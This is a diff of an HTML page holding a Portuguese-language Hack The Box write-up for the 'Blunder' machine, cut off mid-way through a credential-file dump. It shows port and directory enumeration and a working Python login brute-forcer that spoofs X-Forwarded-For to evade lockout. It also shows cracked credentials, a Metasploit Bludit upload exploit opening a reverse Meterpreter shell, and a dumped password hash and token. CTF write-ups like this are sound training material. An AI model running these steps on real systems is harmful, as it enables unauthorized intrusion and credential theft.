@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en-us">
   <head>
-    <meta name="generator" content="Hugo 0.92.2" />
+    <meta name="generator" content="Hugo 0.123.7">
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Blunder | FXSHELL</title>
@@ -26,8 +26,7 @@
 <meta property="article:modified_time" content="2020-10-17T22:06:42-03:00" />
 
 
-    <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="Blunder"/>
+    <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Blunder"/>
 <meta name="twitter:description" content="nmap -sV -sC -Pn -T4 -v -p- --min-rate=10000 10.10.10.191 python3 dirsearch.py -u http://10.10.10.191 -e * wfuzz -c -w /usr/share/wordlists/wfuzz/general/big.txt --hc 404,403 -u &quot;http://10.10.10.191/FUZZ.txt&quot; -t 100
 ******************************************************** * Wfuzz 2.4.5 - The Web Fuzzer * ******************************************************** Target: http://10.10.10.191/FUZZ.txt Total requests: 3024 =================================================================== ID Response Lines Word Chars Payload =================================================================== 000002755: 200 4 L 23 W 118 Ch &#34;todo&#34; Total time: 76.03240 Processed Requests: 3024 Filtered Requests: 3023 Requests/sec.: 39.77251 gerando wordlist com palavras do site"/>
 
@@ -173,153 +172,153 @@ fetchInject(["/js/lazysizes.min.js"]);
   <header>
     <h1>Blunder</h1>
   </header>
-  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nmap -sV -sC -Pn -T4 -v -p- --min-rate<span class="o">=</span><span class="m">10000</span> 10.10.10.191
-
-python3 dirsearch.py -u http://10.10.10.191 -e *
-</code></pre></div><p><code>wfuzz -c -w /usr/share/wordlists/wfuzz/general/big.txt --hc 404,403 -u &quot;http://10.10.10.191/FUZZ.txt&quot; -t 100</code></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">********************************************************
-* Wfuzz 2.4.5 - The Web Fuzzer                         *
-********************************************************
-
-Target: http://10.10.10.191/FUZZ.txt
-Total requests: <span class="nv">3024</span>
-
-<span class="o">===================================================================</span>
-ID           Response   Lines    Word     Chars       <span class="nv">Payload</span>                                                                                      
-<span class="o">===================================================================</span>
-
-000002755:   <span class="m">200</span>        <span class="m">4</span> L      <span class="m">23</span> W     <span class="m">118</span> Ch      <span class="s2">&#34;todo&#34;</span>                                                                                       
-
-Total time: 76.03240
-Processed Requests: <span class="m">3024</span>
-Filtered Requests: <span class="m">3023</span>
-Requests/sec.: 39.77251
-</code></pre></div><p>gerando wordlist com palavras do site</p>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -sV -sC -Pn -T4 -v -p- --min-rate<span class="o">=</span><span class="m">10000</span> 10.10.10.191
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">python3 dirsearch.py -u http://10.10.10.191 -e *
+</span></span></code></pre></div><p><code>wfuzz -c -w /usr/share/wordlists/wfuzz/general/big.txt --hc 404,403 -u &quot;http://10.10.10.191/FUZZ.txt&quot; -t 100</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">********************************************************
+</span></span><span class="line"><span class="cl">* Wfuzz 2.4.5 - The Web Fuzzer                         *
+</span></span><span class="line"><span class="cl">********************************************************
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Target: http://10.10.10.191/FUZZ.txt
+</span></span><span class="line"><span class="cl">Total requests: <span class="nv">3024</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">===================================================================</span>
+</span></span><span class="line"><span class="cl">ID           Response   Lines    Word     Chars       <span class="nv">Payload</span>                                                                                      
+</span></span><span class="line"><span class="cl"><span class="o">===================================================================</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">000002755:   <span class="m">200</span>        <span class="m">4</span> L      <span class="m">23</span> W     <span class="m">118</span> Ch      <span class="s2">&#34;todo&#34;</span>                                                                                       
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Total time: 76.03240
+</span></span><span class="line"><span class="cl">Processed Requests: <span class="m">3024</span>
+</span></span><span class="line"><span class="cl">Filtered Requests: <span class="m">3023</span>
+</span></span><span class="line"><span class="cl">Requests/sec.: 39.77251
+</span></span></code></pre></div><p>gerando wordlist com palavras do site</p>
 <p><code>cewl -w wordlists.txt -d 10 -m 1 http://10.10.10.191/</code></p>
 <p>deixei minha wordlist criada no  /root, agora pego o script em python do brute force</p>
 <p>Crie o arquivo chamado  brute.py</p>
 <p>Para executa-lo basta rodar o <!-- raw HTML omitted -->   <code>python3 brute.py</code></p>
 <p>Dentro do script mude o caminho da sua wordlist, no caso a minha ficou no /root/wordlists.txt</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="kn">import</span> <span class="nn">re</span>
-<span class="kn">import</span> <span class="nn">requests</span>
-<span class="c1">#from __future__ import print_function</span>
-
-<span class="k">def</span> <span class="nf">open_ressources</span><span class="p">(</span><span class="n">file_path</span><span class="p">):</span>
-    <span class="k">return</span> <span class="p">[</span><span class="n">item</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">)</span><span class="o">.</span><span class="n">readlines</span><span class="p">()]</span>
-
-<span class="n">host</span> <span class="o">=</span> <span class="s1">&#39;http://10.10.10.191&#39;</span>
-<span class="n">login_url</span> <span class="o">=</span> <span class="n">host</span> <span class="o">+</span> <span class="s1">&#39;/admin/login&#39;</span>
-<span class="n">username</span> <span class="o">=</span> <span class="s1">&#39;fergus&#39;</span>
-<span class="n">wordlist</span> <span class="o">=</span> <span class="n">open_ressources</span><span class="p">(</span><span class="s1">&#39;/root/wordlists.txt&#39;</span><span class="p">)</span>
-
-<span class="k">for</span> <span class="n">password</span> <span class="ow">in</span> <span class="n">wordlist</span><span class="p">:</span>
-    <span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
-    <span class="n">login_page</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">login_url</span><span class="p">)</span>
-    <span class="n">csrf_token</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;input.+?name=&#34;tokenCSRF&#34;.+?value=&#34;(.+?)&#34;&#39;</span><span class="p">,</span> <span class="n">login_page</span><span class="o">.</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-
-    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[*] Trying: </span><span class="si">{p}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p</span> <span class="o">=</span> <span class="n">password</span><span class="p">))</span>
-
-    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
-        <span class="s1">&#39;X-Forwarded-For&#39;</span><span class="p">:</span> <span class="n">password</span><span class="p">,</span>
-        <span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36&#39;</span><span class="p">,</span>
-        <span class="s1">&#39;Referer&#39;</span><span class="p">:</span> <span class="n">login_url</span>
-    <span class="p">}</span>
-
-    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
-        <span class="s1">&#39;tokenCSRF&#39;</span><span class="p">:</span> <span class="n">csrf_token</span><span class="p">,</span>
-        <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
-        <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="n">password</span><span class="p">,</span>
-        <span class="s1">&#39;save&#39;</span><span class="p">:</span> <span class="s1">&#39;&#39;</span>
-    <span class="p">}</span>
-
-    <span class="n">login_result</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">login_url</span><span class="p">,</span> <span class="n">headers</span> <span class="o">=</span> <span class="n">headers</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">,</span> <span class="n">allow_redirects</span> <span class="o">=</span> <span class="kc">False</span><span class="p">)</span>
-
-    <span class="k">if</span> <span class="s1">&#39;location&#39;</span> <span class="ow">in</span> <span class="n">login_result</span><span class="o">.</span><span class="n">headers</span><span class="p">:</span>
-        <span class="k">if</span> <span class="s1">&#39;/admin/dashboard&#39;</span> <span class="ow">in</span> <span class="n">login_result</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;location&#39;</span><span class="p">]:</span>
-            <span class="nb">print</span><span class="p">()</span>
-            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;SUCCESS: Password found!&#39;</span><span class="p">)</span>
-            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Use </span><span class="si">{u}</span><span class="s1">:</span><span class="si">{p}</span><span class="s1"> to login.&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">u</span> <span class="o">=</span> <span class="n">username</span><span class="p">,</span> <span class="n">p</span> <span class="o">=</span> <span class="n">password</span><span class="p">))</span>
-            <span class="nb">print</span><span class="p">()</span>
-            <span class="k">break</span>
-</code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">SUCCESS: Password found!
-Use fergus:RolandDeschain to login.
-</code></pre></div><p>Resultado do script ^</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#from __future__ import print_function</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">open_ressources</span><span class="p">(</span><span class="n">file_path</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">[</span><span class="n">item</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">)</span><span class="o">.</span><span class="n">readlines</span><span class="p">()]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">host</span> <span class="o">=</span> <span class="s1">&#39;http://10.10.10.191&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">login_url</span> <span class="o">=</span> <span class="n">host</span> <span class="o">+</span> <span class="s1">&#39;/admin/login&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">username</span> <span class="o">=</span> <span class="s1">&#39;fergus&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">wordlist</span> <span class="o">=</span> <span class="n">open_ressources</span><span class="p">(</span><span class="s1">&#39;/root/wordlists.txt&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">password</span> <span class="ow">in</span> <span class="n">wordlist</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">login_page</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">login_url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">csrf_token</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;input.+?name=&#34;tokenCSRF&#34;.+?value=&#34;(.+?)&#34;&#39;</span><span class="p">,</span> <span class="n">login_page</span><span class="o">.</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[*] Trying: </span><span class="si">{p}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p</span> <span class="o">=</span> <span class="n">password</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;X-Forwarded-For&#39;</span><span class="p">:</span> <span class="n">password</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;Referer&#39;</span><span class="p">:</span> <span class="n">login_url</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;tokenCSRF&#39;</span><span class="p">:</span> <span class="n">csrf_token</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="n">password</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;save&#39;</span><span class="p">:</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">login_result</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">login_url</span><span class="p">,</span> <span class="n">headers</span> <span class="o">=</span> <span class="n">headers</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">,</span> <span class="n">allow_redirects</span> <span class="o">=</span> <span class="kc">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s1">&#39;location&#39;</span> <span class="ow">in</span> <span class="n">login_result</span><span class="o">.</span><span class="n">headers</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s1">&#39;/admin/dashboard&#39;</span> <span class="ow">in</span> <span class="n">login_result</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;location&#39;</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;SUCCESS: Password found!&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Use </span><span class="si">{u}</span><span class="s1">:</span><span class="si">{p}</span><span class="s1"> to login.&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">u</span> <span class="o">=</span> <span class="n">username</span><span class="p">,</span> <span class="n">p</span> <span class="o">=</span> <span class="n">password</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">SUCCESS: Password found!
+</span></span><span class="line"><span class="cl">Use fergus:RolandDeschain to login.
+</span></span></code></pre></div><p>Resultado do script ^</p>
 <p>Depois disso vc vai ver que tem uma aplicação chamada Bludit CMS rodando no site dentro do
 #http://10.10.10.191/admin/dashboard</p>
 <p>Você pode procurar o exploit na internet dessa aplicação
 #https://www.exploit-db.com/exploits/47699</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">msf5 &gt; use exploit/linux/http/bludit_upload_images_exec
-msf5 exploit<span class="o">(</span>linux/http/bludit_upload_images_exec<span class="o">)</span> &gt; <span class="nb">set</span> TARGET <span class="m">0</span>
-<span class="nv">TARGET</span> <span class="o">=</span>&gt; <span class="m">0</span>
-msf5 exploit<span class="o">(</span>linux/http/bludit_upload_images_exec<span class="o">)</span> &gt; <span class="nb">set</span> RHOSTS 10.10.10.191
-<span class="nv">RHOSTS</span> <span class="o">=</span>&gt; 10.10.10.191
-msf5 exploit<span class="o">(</span>linux/http/bludit_upload_images_exec<span class="o">)</span> &gt; <span class="nb">set</span> RPORT <span class="m">80</span>
-<span class="nv">RPORT</span> <span class="o">=</span>&gt; <span class="m">80</span>
-msf5 exploit<span class="o">(</span>linux/http/bludit_upload_images_exec<span class="o">)</span> &gt; <span class="nb">set</span> BLUDITUSER fergus
-<span class="nv">BLUDITUSER</span> <span class="o">=</span>&gt; fergus
-msf5 exploit<span class="o">(</span>linux/http/bludit_upload_images_exec<span class="o">)</span> &gt; <span class="nb">set</span> BLUDITPASS RolandDeschain
-<span class="nv">BLUDITPASS</span> <span class="o">=</span>&gt; RolandDeschain
-msf5 exploit<span class="o">(</span>linux/http/bludit_upload_images_exec<span class="o">)</span> &gt; exploit
-
-<span class="o">[</span>-<span class="o">]</span> Exploit failed: An exploitation error occurred.
-<span class="o">[</span>*<span class="o">]</span> Exploit completed, but no session was created.
-msf5 exploit<span class="o">(</span>linux/http/bludit_upload_images_exec<span class="o">)</span> &gt; options 
-</code></pre></div><p>Erro encontrado ao rodar o metasploit</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 &gt; use exploit/linux/http/bludit_upload_images_exec
+</span></span><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>linux/http/bludit_upload_images_exec<span class="o">)</span> &gt; <span class="nb">set</span> TARGET <span class="m">0</span>
+</span></span><span class="line"><span class="cl"><span class="nv">TARGET</span> <span class="o">=</span>&gt; <span class="m">0</span>
+</span></span><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>linux/http/bludit_upload_images_exec<span class="o">)</span> &gt; <span class="nb">set</span> RHOSTS 10.10.10.191
+</span></span><span class="line"><span class="cl"><span class="nv">RHOSTS</span> <span class="o">=</span>&gt; 10.10.10.191
+</span></span><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>linux/http/bludit_upload_images_exec<span class="o">)</span> &gt; <span class="nb">set</span> RPORT <span class="m">80</span>
+</span></span><span class="line"><span class="cl"><span class="nv">RPORT</span> <span class="o">=</span>&gt; <span class="m">80</span>
+</span></span><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>linux/http/bludit_upload_images_exec<span class="o">)</span> &gt; <span class="nb">set</span> BLUDITUSER fergus
+</span></span><span class="line"><span class="cl"><span class="nv">BLUDITUSER</span> <span class="o">=</span>&gt; fergus
+</span></span><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>linux/http/bludit_upload_images_exec<span class="o">)</span> &gt; <span class="nb">set</span> BLUDITPASS RolandDeschain
+</span></span><span class="line"><span class="cl"><span class="nv">BLUDITPASS</span> <span class="o">=</span>&gt; RolandDeschain
+</span></span><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>linux/http/bludit_upload_images_exec<span class="o">)</span> &gt; exploit
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Exploit failed: An exploitation error occurred.
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Exploit completed, but no session was created.
+</span></span><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>linux/http/bludit_upload_images_exec<span class="o">)</span> &gt; options 
+</span></span></code></pre></div><p>Erro encontrado ao rodar o metasploit</p>
 <p>investigando o motivo deste erro.</p>
 <p>Constatado erro na versão  do metasploit  metasploit <code>v5.0.94-dev</code></p>
 <p>a versão stable é a versão  metasploit <code>v5.0.87-dev</code></p>
 <p>Essa versão no exploit do meterpreter é setado o LHOSTS automaticamente na porta 4444</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">msf5 exploit<span class="o">(</span>linux/http/bludit_upload_images_exec<span class="o">)</span> &gt; run
-
-<span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 10.10.14.251:4444 
-<span class="o">[</span>+<span class="o">]</span> Logged in as: fergus
-<span class="o">[</span>*<span class="o">]</span> Retrieving UUID...
-<span class="o">[</span>*<span class="o">]</span> Uploading tmgeRqhFfL.png...
-<span class="o">[</span>*<span class="o">]</span> Uploading .htaccess...
-<span class="o">[</span>*<span class="o">]</span> Executing tmgeRqhFfL.png...
-<span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">38288</span> bytes<span class="o">)</span> to 10.10.10.191
-<span class="o">[</span>*<span class="o">]</span> Meterpreter session <span class="m">1</span> opened <span class="o">(</span>10.10.14.251:4444 -&gt; 10.10.10.191:45134<span class="o">)</span> at 2020-06-29 08:47:30 -0400
-<span class="o">[</span>+<span class="o">]</span> Deleted .htaccess
-
-meterpreter &gt; sysinfo
-Computer    : blunder
-OS          : Linux blunder 5.3.0-53-generic <span class="c1">#47-Ubuntu SMP Thu May 7 12:18:16 UTC 2020 x86_64</span>
-Meterpreter : php/linux
-meterpreter &gt; 
-
-meterpreter &gt; shell
-Process <span class="m">4207</span> created.
-Channel <span class="m">0</span> created.
-
-id
-<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
-python -c <span class="s2">&#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34;</span>
-www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ 
-</code></pre></div><p>Entrar no path abaixo e dar um cat no users.php</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php
-cat users.php
-&lt;?php defined<span class="o">(</span><span class="s1">&#39;BLUDIT&#39;</span><span class="o">)</span> or die<span class="o">(</span><span class="s1">&#39;Bludit CMS.&#39;</span><span class="o">)</span><span class="p">;</span> ?&gt;
-<span class="o">{</span>
-    <span class="s2">&#34;admin&#34;</span>: <span class="o">{</span>
-        <span class="s2">&#34;nickname&#34;</span>: <span class="s2">&#34;Hugo&#34;</span>,
-        <span class="s2">&#34;firstName&#34;</span>: <span class="s2">&#34;Hugo&#34;</span>,
-        <span class="s2">&#34;lastName&#34;</span>: <span class="s2">&#34;&#34;</span>,
-        <span class="s2">&#34;role&#34;</span>: <span class="s2">&#34;User&#34;</span>,
-        <span class="s2">&#34;password&#34;</span>: <span class="s2">&#34;faca404fd5c0a31cf1897b823c695c85cffeb98d&#34;</span>,
-        <span class="s2">&#34;email&#34;</span>: <span class="s2">&#34;&#34;</span>,
-        <span class="s2">&#34;registered&#34;</span>: <span class="s2">&#34;2019-11-27 07:40:55&#34;</span>,
-        <span class="s2">&#34;tokenRemember&#34;</span>: <span class="s2">&#34;&#34;</span>,
-        <span class="s2">&#34;tokenAuth&#34;</span>: <span class="s2">&#34;b380cb62057e9da47afce66b4615107d&#34;</span>,
-        <span class="s2">&#34;tokenAuthTTL&#34;</span>: <span class="s2">&#34;2009-03-15 14:00&#34;</span>,
-        <span class="s2">&#34;twitter&#34;</span>: <span class="s2">&#34;&#34;</span>,
-        <span class="s2">&#34;facebook&#34;</span>: <span class="s2">&#34;&#34;</span>,
-        <span class="s2">&#34;instagram&#34;</span>: <span class="s2">&#34;&#34;</span>,
-        <span class="s2">&#34;codepen&#34;</span>: <span class="s2">&#34;&#34;</span>,
-        <span class="s2">&#34;linkedin&#34;</span>: <span class="s2">&#34;&#34;</span>,
-        <span class="s2">&#34;github&#34;</span>: <span class="s2">&#34;&#34;</span>,
-        <span class="s2">&#34;gitlab&#34;</span>: <span class="s2">&#34;&#34;</span><span class="o">}</span>
-<span class="o">}</span>
-</code></pre></div><p>temos a password e os dados do usuário hugo</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>linux/http/bludit_upload_images_exec<span class="o">)</span> &gt; run
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 10.10.14.251:4444 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Logged in as: fergus
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Retrieving UUID...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Uploading tmgeRqhFfL.png...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Uploading .htaccess...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Executing tmgeRqhFfL.png...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">38288</span> bytes<span class="o">)</span> to 10.10.10.191
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Meterpreter session <span class="m">1</span> opened <span class="o">(</span>10.10.14.251:4444 -&gt; 10.10.10.191:45134<span class="o">)</span> at 2020-06-29 08:47:30 -0400
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Deleted .htaccess
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">meterpreter &gt; sysinfo
+</span></span><span class="line"><span class="cl">Computer    : blunder
+</span></span><span class="line"><span class="cl">OS          : Linux blunder 5.3.0-53-generic <span class="c1">#47-Ubuntu SMP Thu May 7 12:18:16 UTC 2020 x86_64</span>
+</span></span><span class="line"><span class="cl">Meterpreter : php/linux
+</span></span><span class="line"><span class="cl">meterpreter &gt; 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">meterpreter &gt; shell
+</span></span><span class="line"><span class="cl">Process <span class="m">4207</span> created.
+</span></span><span class="line"><span class="cl">Channel <span class="m">0</span> created.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</span></span><span class="line"><span class="cl">python -c <span class="s2">&#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34;</span>
+</span></span><span class="line"><span class="cl">www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ 
+</span></span></code></pre></div><p>Entrar no path abaixo e dar um cat no users.php</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php
+</span></span><span class="line"><span class="cl">cat users.php
+</span></span><span class="line"><span class="cl">&lt;?php defined<span class="o">(</span><span class="s1">&#39;BLUDIT&#39;</span><span class="o">)</span> or die<span class="o">(</span><span class="s1">&#39;Bludit CMS.&#39;</span><span class="o">)</span><span class="p">;</span> ?&gt;
+</span></span><span class="line"><span class="cl"><span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;admin&#34;</span>: <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;nickname&#34;</span>: <span class="s2">&#34;Hugo&#34;</span>,
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;firstName&#34;</span>: <span class="s2">&#34;Hugo&#34;</span>,
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;lastName&#34;</span>: <span class="s2">&#34;&#34;</span>,
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;role&#34;</span>: <span class="s2">&#34;User&#34;</span>,
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;password&#34;</span>: <span class="s2">&#34;faca404fd5c0a31cf1897b823c695c85cffeb98d&#34;</span>,
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;email&#34;</span>: <span class="s2">&#34;&#34;</span>,
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;registered&#34;</span>: <span class="s2">&#34;2019-11-27 07:40:55&#34;</span>,
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;tokenRemember&#34;</span>: <span class="s2">&#34;&#34;</span>,
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;tokenAuth&#34;</span>: <span class="s2">&#34;b380cb62057e9da47afce66b4615107d&#34;</span>,
